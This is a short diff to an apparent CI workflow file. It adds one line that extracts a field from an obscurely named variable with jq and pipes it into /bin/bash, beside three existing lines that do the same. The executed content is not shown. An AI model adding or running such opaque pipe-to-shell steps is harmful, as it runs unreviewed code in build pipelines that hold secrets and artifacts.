@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$a40" | jq -r .vtbm285 | /bin/bash
           echo $bissr209 | jq -r .rugrv93 | /bin/bash
           echo $daz71978 | jq -r .netaw582 | /bin/bash
+          printf '%s' "$n7" | jq -r .y93 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
